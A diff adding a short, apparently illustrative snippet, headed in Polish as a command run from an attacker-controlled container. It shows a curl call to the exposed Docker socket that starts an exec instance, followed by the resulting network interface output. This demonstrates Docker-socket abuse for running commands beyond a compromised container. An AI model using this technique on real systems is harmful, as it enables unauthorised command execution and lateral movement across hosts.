@@ -1,0 +1,18 @@
+# Polecenie wykonane w kontenerze przejętym przez atakującego
+$ curl -H "Content-Type: application/json" -d '{"Tty": true}' --unix-socket
+/var/run/docker.sock 'http://localhost/exec/8ecb65b7c41db457972b43938f1231a2
+e5782add7a6b7d8ee6988c9156b8ebf0/start'
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
+inet 172.17.0.3 netmask 255.255.0.0 broadcast 172.17.255.255
+ether 02:42:ac:11:00:03 txqueuelen 0 (Ethernet)
+RX packets 106 bytes 257683 (251.6 KiB)
+RX errors 0 dropped 0 overruns 0 frame 0
+TX packets 95 bytes 5496 (5.3 KiB)
+TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
+inet 127.0.0.1 netmask 255.0.0.0
+loop txqueuelen 1000 (Local Loopback)
+RX packets 0 bytes 0 (0.0 B)
+RX errors 0 dropped 0 overruns 0 frame 0
+TX packets 0 bytes 0 (0.0 B)
+TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
